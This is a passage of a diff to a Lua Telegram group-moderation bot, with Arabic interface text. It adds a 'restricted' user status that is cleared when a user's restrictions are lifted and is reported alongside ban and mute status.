+database:srem(bot_id..'Tkeed:User'..msg.chat_id_,result.sender_user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
 usertext = '\n ✯︙ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
 status  = '\n ✯︙ تم الغاء جميع القيود'
@@ -7799,6 +7928,7 @@ end,nil)
 else
 database:srem(bot_id..'Ban:User'..msg.chat_id_,result.sender_user_id_)
 database:srem(bot_id..'Muted:User'..msg.chat_id_,result.sender_user_id_)
+database:srem(bot_id..'Tkeed:User'..msg.chat_id_,result.sender_user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
 usertext = '\n ✯︙ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
 status  = '\n ✯︙ تم الغاء جميع القيود'
@@ -7826,6 +7956,11 @@ Muted = 'مكتوم'
 else
 Muted = 'غير مكتوم'
 end
+if database:sismember(bot_id..'Tkeed:User'..msg.chat_id_,result.id_) then
+Tkeed = 'مقيد'
+else
+Tkeed = 'غير مقيد'
+end
 if database:sismember(bot_id..'Ban:User'..msg.chat_id_,result.id_) then
 Ban = 'محظور'
 else
@@ -7836,7 +7971,7 @@ GBan = 'محظور عام'
 else
 GBan = 'غير محظور عام'
 end
-Textt = " ✯︙ الحظر العام » "..GBan.."\n ✯︙ الحظر » "..Ban.."\n ✯︙ الكتم » "..Muted..""
+Textt = " ✯︙ الحظر العام » "..GBan.."\n ✯︙ الحظر » "..Ban.."\n ✯︙ الكتم » "..Muted.."\n ✯︙ التقيد » "..Tkeed..""
 send(msg.chat_id_, msg.id_,Textt)
 else
 Text = ' ✯︙ المعرف غلط'
@@ -7862,6 +7997,11 @@ Muted = 'مكتوم'
 else
 Muted = 'غير مكتوم'
 end
+if database:sismember(bot_id..'Tkeed:User'..msg.chat_id_,result.sender_user_id_) then
+Tkeed = 'مقيد'
+else
+Tkeed = 'غير مقيد'
+end
 if database:sismember(bot_id..'Ban:User'..msg.chat_id_,result.sender_user_id_) then
 Ban = 'محظور'
 else
@@ -7877,7 +8017,7 @@ Gmute = 'محظور عام'
 else
 Gmute = 'غير محظور عام'
 end
-Textt = " ✯︙ الحظر العام » "..GBan.."\n ✯︙ الكتم العام » "..Gmute.."\n ✯︙ الحظر » "..Ban.."\n ✯︙ الكتم » "..Muted..""
+Textt = " ✯︙ الحظر العام » "..GBan.."\n ✯︙ الكتم العام » "..Gmute.."\n ✯︙ الحظر » "..Ban.."\n ✯︙ الكتم » "..Muted.."\n ✯︙ التقيد » "..Tkeed..""
 send(msg.chat_id_, msg.id_,Textt)
 end
 tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
